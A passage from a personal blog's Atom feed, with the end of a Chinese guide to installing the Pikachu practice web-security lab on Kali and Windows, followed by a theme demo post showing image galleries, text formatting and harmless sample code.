class="keyword">var</span>/www/html中</span><br><span class="line">mv pikachu-master /<span class="keyword">var</span>/www/html/pikachu</span><br><span class="line"></span><br><span class="line">开启相关服务（kali自带<span class="variable constant_">PHP</span>+<span class="variable constant_">MYSQL</span>）</span><br><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br><span class="line"></span><br><span class="line">登录到网页界面，浏览器输入<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/pikachu</span><br><span class="line"></span><br><span class="line">点击初始化安装→安装/初始化</span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">数据库连接成功!</span><br><span class="line">新建数据库:pikachu成功!</span><br><span class="line">创建数据库数据成功!</span><br></pre></td></tr></table></figure><h1 id="Windows下搭建"><a href="#Windows下搭建" class="headerlink" title="Windows下搭建"></a>Windows下搭建</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装phpstudy，并部署启动环境</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//www.xp.cn/download.html</span></span><br></pre></td></tr></table></figure><p><img src="/image1/1.png"><br><img src="/image1/2.png"><br><img src="/image1/3.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">下载pikachu压缩包</span><br><span class="line"></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//github.com/zhuifengshaonianhanlu/pikachu</span></span><br><span class="line"></span><br><span class="line">解压到phpstudy_pro\<span class="variable constant_">WWW</span>目录下</span><br><span class="line"></span><br><span class="line">修改配置文件，否则是连不上数据库的</span><br><span class="line"></span><br><span class="line">phpstudy_pro\<span class="variable constant_">WWW</span>\pikachu-master\inc\conf.<span class="property">inc</span>.<span class="property">php</span></span><br></pre></td></tr></table></figure><p><img src="/image1/4.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">浏览器打开<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span>/pikachu-master/</span><br><span class="line"></span><br><span class="line">点击初始化安装→安装/初始化</span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">数据库连接成功!</span><br><span class="line">新建数据库:pikachu成功!</span><br><span class="line">创建数据库数据成功!</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，可以选择pikahcu。&lt;/p&gt;
&lt;h1 id=&quot;Kali系统下搭建：&quot;&gt;&lt;a href=&quot;#Kali系统下搭建：&quot; class</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>日子匆忙，不要错过落日与夕阳</title>
    <link href="https://jielunya.github.io/2022/11/19/post-example/"/>
    <id>https://jielunya.github.io/2022/11/19/post-example/</id>
    <published>2022-11-18T16:00:00.000Z</published>
    <updated>2022-11-20T14:00:09.296Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/assets/3.png" alt="Powered By Jielun" title="Powered By Jielun"></p><span id="more"></span><h2 id="瀑布流图片"><a href="#瀑布流图片" class="headerlink" title="瀑布流图片"></a>瀑布流图片</h2><div class="fj-gallery"><p><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192754.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192756.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192757.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192530.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192531.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192534.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192535.jpg" alt="1"><br><img src="https://cdn.jsdelivr.net/gh/nexmoe/image@latest/20210207192415.jpg" alt="1"></p>          </div><h2 id="相片集"><a href="#相片集" class="headerlink" title="相片集"></a>相片集</h2><table><thead><tr><th><img src="https://i.loli.net/2018/09/01/5b8a59551a4d8.jpg" alt="珠江"></th><th><img src="https://i.loli.net/2018/09/01/5b8a6ab761262.jpg" alt="珠江"></th><th><img src="https://i.loli.net/2018/09/01/5b8a5994b6e28.jpg" alt="某收门票公园"></th></tr></thead><tbody><tr><td><img src="https://i.loli.net/2018/09/01/5b8a5994b6e28.jpg" alt="某收门票公园"></td><td><img src="https://i.loli.net/2018/09/01/5b8a5c8c34439.jpg" alt="某收门票公园"></td><td><img src="https://i.loli.net/2018/09/01/5b8a59d5c50f3.jpg" alt="珠海"></td></tr></tbody></table><h2 id="字符效果和横线等"><a href="#字符效果和横线等" class="headerlink" title="字符效果和横线等"></a>字符效果和横线等</h2><hr><p><del>删除线</del><br><em>斜体字</em>      <em>斜体字</em><br><strong>粗体</strong>  <strong>粗体</strong><br><em><strong>粗斜体</strong></em> <em><strong>粗斜体</strong></em></p><p>上标：X<sub>2</sub>，下标：O<sup>2</sup></p><p><strong>缩写(同HTML的abbr标签)</strong></p><blockquote><p>即更长的单词或短语的缩写形式，前提是开启识别HTML标签时，已默认开启</p></blockquote><p>The <abbr title="Hyper Text Markup Language">HTML</abbr> specification is maintained by the <abbr title="World Wide Web Consortium">W3C</abbr>.</p><h2 id="引用-Blockquotes"><a href="#引用-Blockquotes" class="headerlink" title="引用 Blockquotes"></a>引用 Blockquotes</h2><blockquote><p>引用文本 Blockquotes</p></blockquote><h2 id="锚点与链接-Links"><a href="#锚点与链接-Links" class="headerlink" title="锚点与链接 Links"></a>锚点与链接 Links</h2><p><a href="http://localhost/">普通链接</a></p><p><a href="http://localhost/" title="描述">普通链接带描述</a></p><p>直接链接：<a href="https://github.com/">https://github.com</a></p><h2 id="多语言代码高亮-Codes"><a href="#多语言代码高亮-Codes" class="headerlink" title="多语言代码高亮 Codes"></a>多语言代码高亮 Codes</h2><h4 id="行内代码-Inline-code"><a href="#行内代码-Inline-code" class="headerlink" title="行内代码 Inline code"></a>行内代码 Inline code</h4><p>执行命令：<code>npm install marked</code></p><h4 id="JS代码"><a href="#JS代码" class="headerlink" title="JS代码"></a>JS代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> box = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> box.<span class="property">fn</span>.<span class="title function_">init</span>();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    box.<span class="property"><span class="keyword">prototype</span></span> = box.<span class="property">fn</span> = &#123;</span><br><span class="line">        init : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;box.init()&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">add : <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;add&quot;</span>, str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">remove : <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;remove&quot;</span>, str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    box.<span class="property">fn</span>.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span> = box.<span class="property">fn</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">box</span> =box;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> testBox = <span class="title function_">box</span>();</span><br><span class="line">testBox.<span class="title function_">add</span>(<span class="string">&quot;jQuery&quot;</span>).<span class="title function_">remove</span>(<span class="string">&quot;jQuery&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="HTML代码-HTML-codes"><a href="#HTML代码-HTML-codes" class="headerlink" title="HTML代码 HTML codes"></a>HTML代码 HTML codes</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mate</span> <span class="attr">charest</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="列表-Lists"><a href="#列表-Lists" class="headerlink" title="列表 Lists"></a>列表 Lists</h3><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><ul><li>列表一</li><li>列表二<ul><li>列表二-1</li><li>列表二-2</li><li>列表二-3</li></ul></li><li>列表三<ul><li>列表一</li><li>列表二</li><li>列表三</li></ul></li></ul><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><ol><li>第一行</li><li>第二行</li><li>第三行</li></ol><h4 id="GFM-task-list"><a href="#GFM-task-list" class="headerlink" title="GFM task list"></a>GFM task list</h4><ul><li><input checked="" disabled="" type="checkbox"> GFM task list 1</li><li><input checked="" disabled="" type="checkbox"> GFM task list 2</li><li><input disabled="" type="checkbox"> GFM task list 3<ul><li><input disabled="" type="checkbox"> GFM task list 3-1</li><li><input disabled="" type="checkbox"> GFM task list 3-2</li><li><input disabled="" type="checkbox"> GFM task list 3-3</li></ul></li><li><input disabled="" type="checkbox"> GFM task list 4<ul><li><input disabled="" type="checkbox"> GFM task list 4-1</li><li><input disabled="" type="checkbox"> GFM task list 4-2</li></ul></li></ul><hr><br>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/assets/3.png&quot; alt=&quot;Powered By Jielun&quot; title=&quot;Powered By Jielun&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="₍ᐢ •͈ ༝ •͈ ᐢ₎♡" scheme="https://jielunya.github.io/categories/%E2%82%8D%E1%90%A2-%E2%80%A2%CD%88-%E0%BC%9D-%E2%80%A2%CD%88-%E1%90%A2%E2%82%8E%E2%99%A1/"/>
    
    
    <category term="つ♡⊂" scheme="https://jielunya.github.io/tags/%E3%81%A4%E2%99%A1%E2%8A%82/"/>
    
  </entry>
  
</feed>
